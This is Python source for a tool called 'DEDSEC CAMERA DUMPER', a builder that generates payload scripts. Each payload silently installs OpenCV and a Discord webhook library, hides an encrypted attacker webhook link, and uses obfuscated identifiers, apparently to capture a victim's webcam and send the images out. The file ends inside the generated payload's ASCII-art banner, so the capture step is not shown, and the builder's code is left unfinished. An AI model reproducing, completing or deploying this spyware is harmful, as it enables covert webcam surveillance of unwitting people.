#coded by 0xbit
from cryptography.fernet import Fernet
from tabulate import tabulate
import os, time, sys, re
from pystyle import *

dark = Col.dark_gray
light = Colors.StaticMIX((Col.cyan, Col.purple, Col.gray))
acc = Colors.StaticMIX((Col.cyan, Col.purple, Col.blue, Col.gray))
purple = Colors.StaticMIX((Col.green, Col.blue))
bpurple = Colors.StaticMIX((Col.purple, Col.cyan))

def stage(text: str, symbol: str = '...', col1=light, col2=None) -> str:
    if col2 is None:
        col2 = light if symbol == '...' else purple
    if symbol in {'...', '!!!'}:
        return f"""     {Col.Symbol(symbol, col1, dark)} {col2}{text}{Col.reset}"""
    else:
        return f""" {Col.Symbol(symbol, col1, dark)} {col2}{text}{Col.reset}"""
    
banner = '''
⢠⣶⠋⠉⠉⠉⠉⠉⠉⠉⠀⠐⠒⠒⠒⠀⠒⠒⠒⠂⠠⠤⠤⠤⠤⠤⠤⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡞⢻⠀⠀⣴⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠲⠤⠤⠤⣄⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⢸⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢱⠸⡀⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⡀⡇⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡇⢹⠀⠀⡇⠀⠀⠀ASHLEY LOOK AT ME⠀⠀ ⢸⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢇⢸⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⠀⡆⠀⠸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡆⢳⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⣇⢸⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⠔⠚⠁⢀⣇⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡄⢳⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡠⠤⠔⠒⠋⠉⣁⣠⣤⣶⣶⣿⣿⣿⣿⣍⣑⠲⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣇⠘⡆⠀⠻⣄⣀⡤⠤⠴⠒⠒⠈⠉⠁⣀⣠⠤⠴⣶⣮⢿⣿⣿⢿⣿⣿⣿⣿⠻⣍⣹⠞⢿⣷⠶⢤⣍⠉⠓⠲⠤⣄⡀⠀⠀⠀
⠀⠀⠀⢸⡀⢱⠀⠀⠀⠀⠀⢀⣀⡤⠤⠒⠚⣉⣩⠵⣶⣯⡽⠛⣯⡡⢿⡛⢉⣧⠴⣿⣿⣷⠞⢻⣧⣼⣷⠿⠋⠀⠀⠀⠀⠀⠈⠉⠒⢤
⠀⠀⠀⠀⣧⣈⣷⠴⠒⠊⠉⢁⣠⡤⠖⣾⣽⡽⠗⣻⡧⠴⣟⢉⣹⠦⠾⣋⣩⠷⠚⢉⣤⣾⣿⣿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠖⠉
⠀⠀⠀⠀⠈⣹⠋⠢⡀⠀⠺⣭⢼⡟⣚⡿⠞⢿⣉⣉⠦⠶⣏⣉⠽⠖⠊⣁⣤⣖⣪⣿⣿⠿⠛⠉⠙⠢⣄⠀⠀⠀⠀⣀⡤⠚⠉⣀⡤⠚
⠀⠀⠀⠀⠀⠙⢧⡀⠈⠢⡀⠘⢿⣏⣉⡦⠔⢾⣋⣨⡷⠒⢻⣄⡤⢒⣯⠽⣻⡭⠞⠉⠀⠀⠀⠀⠀⣠⠞⠀⣀⠴⠊⠁⢀⡤⠚⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠉⠢⡀⠉⠣⣤⠒⢯⣁⣠⣿⣶⡿⠗⠋⠉⠸⡏⠁⠀⠀⠀⠀⢀⡠⠔⢋⡡⠔⠋⢀⡠⠔⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⡀⠈⠢⡀⠈⠳⠾⠟⠛⠉⠁⠀⠀⠀⠀⠀⠙⠢⣀⣀⡤⠒⣉⡤⠒⠉⣀⡤⠖⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠋⠁⣠⠴⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⣄⠈⠓⢄⡀⠀⠀⠀⠀⠀⢀⡠⠴⠚⠉⢀⡤⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⡀⠙⠦⠤⠤⠔⠊⠁⢀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⢤⣀⣀⡤⠖⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
'''

banner1 = '''
                [ DEDSEC CAMERA DUMPER ]

        [1]. GENERATE PAYLOAD
        [2]. IMPORT WEBHOOK
        [0]. EXIT
'''

def encrypt(text, key):
    cipher_suite = Fernet(key)
    encrypted_api = cipher_suite.encrypt(text.encode())
    return encrypted_api

def sc(bb):
    return bb.swapcase()

def create_payload():
    try:
        with open('.w.txt', 'r'):
            pass
    except FileNotFoundError:
        with open('.w.txt', 'w') as file:
            pass

    payload_name = input('\n\tPAYLOAD NAME: ')

    with open('.w.txt', 'r') as f:
        api_key = f.readline().strip()
        if not api_key:
            print()
            print(tabulate([['ADD WEBHOOK LINK FIRST']], tablefmt='fancy_grid'))
            time.sleep(3)
            return menu()
        else:
            pass
        f.close()

    key = Fernet.generate_key()
    encrypted_api = encrypt(api_key, key)
    encrypted_api_str = encrypted_api.decode()
    key_str = key.decode()
    char2 = 'A'
    repl2 = '.'
    var1 = encrypted_api_str.replace(char2, repl2)
    var2 = key_str.replace(char2, repl2)
    n_v_1 = sc(var1)
    n_v_2 = sc(var2)

    with open(f'{payload_name}.py', 'w') as write_p:
            write_p.write(f"""
import subprocess

def mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6(package_name):
    print('loading..')
    try:
        subprocess.check_output(["pip", "show", package_name], stderr=subprocess.DEVNULL, universal_newlines=True)
    except subprocess.CalledProcessError:
        subprocess.call(["pip", "install", package_name], stderr=subprocess.DEVNULL, stdout=subprocess.PIPE)

mbV0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6 = ["opencv-python ", "discord-webhook"]

for package in mbV0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6:
    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6(package)

import cv2, os, subprocess
from discord_webhook import DiscordWebhook as UiNpJWciiXk
from cryptography.fernet import Fernet

def mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6(end, ends):
    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = Fernet(ends)
    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_Ofb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6.decrypt(end).decode()
    return mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_Ofb9oA6LxRud3fr9huB8k_VgYBXyjduf6

banner = ''''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠾⠿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⡿⠋⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⠾⠿⠿⠛⠛⠛⠛⠻⠿⠿⢷⣶⣿⣥⡀⠀⠀⠀⠀⠀⠀⣠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⣴⣾⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣟⠛⢷⣦⣄⠀⣠⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⢀⣴⡿⢿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠈⠙⢿⣿⣥⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢃⣴⡿⠋⠀⠈⢿⣄⠀⠀⠀⠀⠀⠀⠀⠘⠷⣦⡀⠀⣤⡀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠈⢻⣦⠈⠻⡷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠋⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠈⢿⣆⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠙⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠙⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠘⣿⠀⠀⠀⠀⣸⡟⠀⠀⠀⠠⣤⡄⢹⣿⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠀⠀⠀⠀⢸⡏⠀⢀⣿⠀⠀⠀⠀⠛⠀⠀⠀⠀⠀⠈⣿⣾⣿⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⣼⡇⠀⣸⡏⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⣿⡇⣿⣿⣧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡷⠀⠀⠀⠀⠀⠀⣿⠀⢠⡟⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⢰⣿⠁⣿⣿⣿⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠸⣿⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠘⢿⡄⠀⣾⠏⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀⠀⣿⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⢰⣿⠀⢰⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⢻⡇⠀⠀⠀⠀⠀⠀⢰⡿⠀⠀⢿⣤⣾⣿⣿⣿⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⠀⣀⣤⣀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⢻⠃⠀⢸⣷⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⢀⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⢀⡾⠋⢹⡿⠁⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠸⣦⡀⠘⣿⠀⢀⣰⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⠀⠀⠀⠚⠁⠀⣼⠏⠀⠀⠀⠀⠀⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⢹⡇⠀⢿⣶⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣿⣴⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠟⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⣤⣾⣿⣿⣿⣿⣿⢿⣿⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣿⣷⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡿⠛⠁⢸⣿⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⢛⣭⣷⣶⣶⣶⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣶⣶⣶⣶⣦⣄⠀⠰⣿⣿⣿⡿⠟⢿⣇⠀⠀⢸⡟⠀⠀⠐⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡇⣿⠏⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⣠⡾⠛⠉⠀⠀⠀⠀⠈⠹⣷⠀⣿⡿⠋⠀⠀⠀⢿⡄⠀⣿⠃⠀⠀⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⣧⢻⣧⣤⣤⣤⣾⣷⣄⣀⣿⣆⠀⠀⣴⣟⣀⣀⣠⣶⣦⣀⣀⣀⣠⣿⢡⣿⠁⠀⠀⠀⠀⢸⣿⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⡙⢿⣭⣉⠉⠉⠉⠉⣹⡟⠀⠐⣿⡛⠛⠛⠛⠛⠛⠛⣛⣿⡿⣣⣿⠋⠀⠀⠀⠀⢀⣾⠃⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣭⣛⠿⠿⠶⠾⠟⠁⠀⠀⠙⠿⣶⣶⣶⣶⡶⢿⣿⣿⣿⣿⠁⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣾⣿⡟⢿⣆⠹⣷⡀⠀⠀⢀⣿⠃⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⡈⠛⢷⣌⠻⣧⡙⣷⡄⠀⠘⠃⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀ASLE LOOK AT ME!⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⠀⣶⡶⣶⣿⣿⣷⣤⡙⣷⣝⣿⣜⢿⡄⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠙⢷⣦⣈⠛⢿⣿⣿⣮⡻⣿⣿⡌⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣶⣌⠛⢿⣿⠈⠛⠃⠀⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⡏⠻⣷⣄⠀⠀⠀⠀⣀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⢀⣀⣠⣤⣤⣄⡀⢿⣿⡇⠀⠈⠻⣧⡀⠀⠀⢻⣆⠀⠀⠈⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣷⣶⣿⣿⡿⠛⠉⢉⣉⣹⣿⣶⣻⣷⡀⠀⠀⠙⣷⡄⠀⠈⢻⣆⠀⠀⠀⠉⠻⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣉⣿⣷⣤⣀⣀⣉⣀⣀⣼⣿⣿⠃⠀⠀⠀⢹⣷⠀⠀⠀⢈⣠⣾⣿⣦⡀⠀⠙⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣿⣭⣭⣭⣍⡉⠙⠛⠋⣩⣿⣿⣄⣀⣀⣠⣾⠃⣀⣴⣾⠿⠛⠁⠈⠙⠻⣷⣤⣀⠈⠙⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⣿⡿⠉⠀⠀⠀⠀⠉⠀⠉⠛⢻⣿⠟⣡⣾⣿⣿⣤⣤⣤⣄⣀⡀⠀⠀⠙⠻⣷⣤⡀⠀⠙⠻⣦⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⡀⠀⠀⠀⠀⣠⣤⠀⢠⣿⠃⣴⡿⠉⡿⠛⠁⠀⠈⠉⠛⠛⠻⠷⠶⣶⣾⣿⣿⣦⡀⠀⠈⠙⢷⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣶⣶⣶⡿⠟⠁⠀⠸⣿⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⡀⠀⠀⠀⠀⠀⠉⠛⠀⠀⠀⠀⠙⢿⣆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠘⠻⠿⢿⣿⣿⣿⣿⡿⣿⣶⣶⣶⣤⣤⣤⣤⣠⣤⣼⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⢴⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣷⣄⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠘⣿⣷⡀⢀⠀⠀⠀⠀⠀⣀⡀⠀⣀⣠⠀⠀⠀⠀⠀⠈⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡟⣷⣾⡇⠀⠀⠀⠀⠙⠛⠿⠟⠁⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⣿⡇⠈⠙⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀YYY
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢀⣿⠇⠀⠀⠘⣿⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⢹⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⡟⠀⢸⣿⠀⠀⢀⣾⠟⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠁⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣴⣶⣶⠿⠿⠛⠁⢀⣠⣾⣿⣶⣶⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣤⣾⡿⠿⠛⠛⠋⠉⣉⣉⣉⣁⣀⣠⣤⣤⣤⣴⣾⡿⠟⠋⠁⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⢀⣾⠟⠁⠀⠀⠀⣿⣿⣿⡿⠛⠛⠛⠛⠿⠛⠛⠹⢷⣶⣶⣶⣶⣶⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀
⠀⢀⣾⠃⠀⠀⠀⠀⠀⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⢉⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀
⠀⣾⣿⠀⠀⠀⢀⡀⠀⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀
⣼⣿⣿⢰⡗⠀⣼⡇⢸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠛⣿⣿⣿⣶⣤⣄⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⣿⣿⡇⣾⠃⢰⣿⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⠉⠉⠉⢻⣿⣿⣿⣧⠀⠀⠀⠀⠀
